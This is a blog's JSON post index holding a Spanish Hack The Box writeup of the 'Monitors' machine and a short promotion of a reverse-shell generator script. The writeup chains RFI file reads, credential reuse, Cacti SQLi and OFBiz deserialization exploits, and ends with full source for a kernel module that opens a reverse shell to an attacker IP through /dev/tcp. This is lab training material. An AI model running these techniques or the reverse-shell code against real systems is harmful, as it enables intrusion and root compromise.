[
  
  {
    "title": "Monitors",
    "url": "/posts/Monitors/",
    "categories": "",
    "tags": "OSCP, OSWE",
    "date": "2022-12-04 17:59:28 +0100",
    





    
    "snippet": "Hoy vamos a realizar un writeup de maquina linux retirada Monitors alojada en la plataforma de Hack The Box,  por aqui os dejo mi perfil por si quereis darme respect jejejej  https://www.hackthebox...",
    "content": "Hoy vamos a realizar un writeup de maquina linux retirada Monitors alojada en la plataforma de Hack The Box,  por aqui os dejo mi perfil por si quereis darme respect jejejej  https://www.hackthebox.com/home/users/profile/1019735UserHacemos un escaneo inicial para ver los puertos abiertos\tsudo nmap -sS --min-rate 5000 -p- -open -n -Pn 10.10.10.238Acto seguido usamos los scripts que nos aporta la utilidad nmap para hacer un reconocimiendo de los mismos\tsudo nmap -sCV -p22,80 -n -Pn 10.10.10.238 -oN targetedEntramos a la web que se ejecuta en el puerto 80, vemos que nos dice lo siguiente aprovechandonos del correo vemos el dominio \"monitors.htb\" este mismo deberemos añadirlo al fichero /etc/hosts para que al ponerlo nos resuelva hacia la maquina y ver si se aplica virtual hosting10.10.10.238 monitors.htbEntramos a la web y vemos que se aplica Virtual Hosting ya que cambia el contenido, leyendo el pie de pagina vemos que estamos frente a un wordpress por lo que podríamos enumerar usuarios validos en el login pero en este caso no ya que solo hay un post del usuario admin.Por lo que se nos ocurririía enumerar plugins en busca de alguno vulnerable.Para esto podríamos usar el repositorio de seclists en github que nos incluye diccionarios para probar fuzzeando o mejor aun construirnos un script que nos permita crear un diccionario con los nombres de los 52.700 plugins registrados.Primeramente probaremos a ver si tenemos capacidad de directory listing en /wp-content/plugins/ y efectivamente la tenemos lo cual es poco habitualCon esto en mano buscamos el unico plugin en searchsploit por si hubiese alguna vulnerabilidad asociada y encontramos un RFI -&gt; Remote File InclusionSi lo examinamos podemos ver como funcionaTeniendo esto en cuenta listamos archivos de utilidad como pueden ser el /etc/passwd para ver los usuarios existentes  ( Ya que se trata de un RFI si probamos a cargar un archivo php de nuesta maquina vemos que no nos lo interpreta asi que solo podremos listar contenido de la propia maquina)Tambien podemos listar el archivo /proc/net/tcp para ver los puertos abiertosEn este caso lo hago con curl para guardar el resultado en un archivoY con la herramienta que creé y que está en mi github: https://github.com/whitexnd/OpenPorts podemos ver que puertos tiene abiertos internamente en este caso el 80 no sale representado lo cual es un poco raro y vemos tambien el puerto 8443 el cual tambien es un poco raroTambien listamos el archivo /etc/apache2/sites-enabled/000-default.conf el cual contiene información de la web y vemos que hay un subdomnio, lo añadimos de nuevo al fichero /etc/hostsY lo buscamos a ver si hubiese contenido, en este caso vemos Cacti que parece ser una utilidad de graficos según googleTambien aprovechamos para ver el fichero wp-config.php el cual suele contener el usuario y contraseña empleados en la base de datos de wordpressProbamos a logearnos con admin y la credencial que vimos por si se reutilizaraY logramos acceso a cactiBuscamos en searchsploit por si hubiera algun tipo de exploit para la versión de cacti que utiliza la maquinaMediante una inyección sql (SQLi) busca entablar una reverse shell, por lo que lo usaremos para automatizar este procesoUna vez dentro como el user www-data vemos que hay otro usuario marcus al cual nos interesa pivotar para poder ver su flag, listamos su home y vemos algo raroHay una carpeta oculta .backup a la cual no tenemos accesoPor lo que en este punto probamos a grepear recursivamente la cadena marcus en algun fichero en /etc y encontramos que algo menciona a un script en shell dentro de la carpeta que vimos antesTratamos de hacerle un cat para ver si tuviesemos acceso a su contenido y vemos un usuario y contraseñaLa probamos por si se reutilizaseY ya unicamente listariamos la flag user.txt de su direcctorioRootExaminamos nuestra ip por si se estuviesemos en un contenedor y en este caso noViendo de nuevo el direcctorio personal vemos un archivo note.txt que habla de una imagen dockerPor lo que pensando en esto y sin la capacidad de ver las imagenes de docker activas buscamos algun puerto más abierto y volvemos a ver el 8443Ahora mediante SSH realizamos un Local Port Forwarding para que nuestro puerto local sea el mismo que el de la victima y podamos verlossh marcus@10.10.10.238 -L 8443:127.0.0.1:8443Y navegando vemos que tenemos accesoHacemos uso de wfuzz para encontrar direcctorioswfuuz\t-c -&gt; Formato colorizado\t-t -&gt; Cantidad de hilos\t--hc=404 -&gt; Para que nos oculte las peticiones que devuelvan el estado 404\t-w -&gt; Indicarle el diccionarioVemos varios que nos dan un codigo 302 el cual es un redirectPonemos uno cualquiera y nos lleva a la siguiente webViendo el footer vemos que emplea Apache OFBizY buscando exploit relacionados a esto encontramos un script en shell el cual nos permite RCE -&gt; Remote Command ExecutionSegún el script se trata de un ataque de Insecure Deserialization podríamos ejecutar el script pasandole los argumentos y obtendríamos acceso, en este caso lo he ido haciendo sentencia a sentenciaPrimero cargando mi payload en un fichero que posteriormente la victima se descargaráDescargarnos el archivo indicado en el script para generar JAR pyaloadsGeneramos uno con la siguiente sentencia que lo que hace es descargarse un recurso de nuestra maquina y guardarlo en la ruta /tmp, todo esto lo convertimos a base64 y le quitamos el salto de linea del finalIniciamos el servidor web desde el que compartiremos nuestro shell.sh maliciosoHacemos una petición curl como se especifica en el script junto al payload jar que hemos creadoY vemos que efectivamente se ha ejecutado ya que hemos recibido una petición GET al archivo shell.shCreamos el ultimo payload para que interprete el archivo que guardó en /tmpHacemos el curlY vemos que por el puerto en el que estabamos en escucha nos llega la reverse shellVemos nuestra ip para ver si estamos en un docker y efectivamenteNos descargamos LinPeas, el cual es una utilidad de reconocimineto del sistema que podemos encontrar en github y nos la compartimos con un servidor web python como en el anterior ejemplo para descargarnoslo en la maquina victima, despues le damos permisos de ejecución y lo ejecutamos. Atendiendo al resultado vemos que está asignada la capabilitie cap_sys_moduleCon el siguiente comando podemos listar las capabilitiesBuscando en google encontramos esta pagina la cual nos explica bastante bien como funciona y como abusar de la capabilitiehttps://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956eddEn este caso tenemos que crearnos el siguiente archivo con nuestra ip y puerto para intentar cargar un modulo kernel que nos entable una reverse shell#include &lt;linux/kmod.h&gt;#include &lt;linux/module.h&gt;MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"AttackDefense\");MODULE_DESCRIPTION(\"LKM reverse shell module\");MODULE_VERSION(\"1.0\");char* argv[] = {\"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/10.10.14.22/4444 0&gt;&amp;1\", NULL};static char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};static int __init reverse_shell_init(void) {\treturn call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) {\tprintk(KERN_INFO \"Exiting\\n\");}module_init(reverse_shell_init);module_exit(reverse_shell_exit);Y tambien un makefile con las siguientes instrucciones:obj-m +=reverse-shell.oall:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanUna vez con estos dosEjecutamos el comando makeNos ponemos en escuchaY cargamos en el kernel el fichero reverse-shell.ko que nos generóY vualá obtenemos una sesión como root en la maquina victimaY ya podemos listar la flag«««&lt; HEAD=======                                                        fc516fd7b8d8b3ccdeedc9ad2860e821192a35c9                                          "
  },
  
  {
    "title": "EvilShell",
    "url": "/posts/EvilShell/",
    "categories": "",
    "tags": "Scripts",
    "date": "2022-11-23 12:48:00 +0100",
    





    
    "snippet": "EvilShell  EvilShell its a bash script that simplifies the creation of reverse shellsInstalationgit clone https://github.com/whitexnd/EvilShellUsage  By default takes the ip from the iface tun0 and...",
    "content": "EvilShell  EvilShell its a bash script that simplifies the creation of reverse shellsInstalationgit clone https://github.com/whitexnd/EvilShellUsage  By default takes the ip from the iface tun0 and the port 443You can specify the ip with -i and the port with -palso you can select the shell with -s parameter  If u want to encode the payload u can use-e &lt;encoder&gt;Current encoders are b64 (base64) and urlOptionalI suggest you to add it into your $PATH with the following commands:      chmod +x evilshell.sh        sudo mv evilshell.sh /bin/evilshell  Then u can use it like this:  evilshell -s python"
  }
  
]

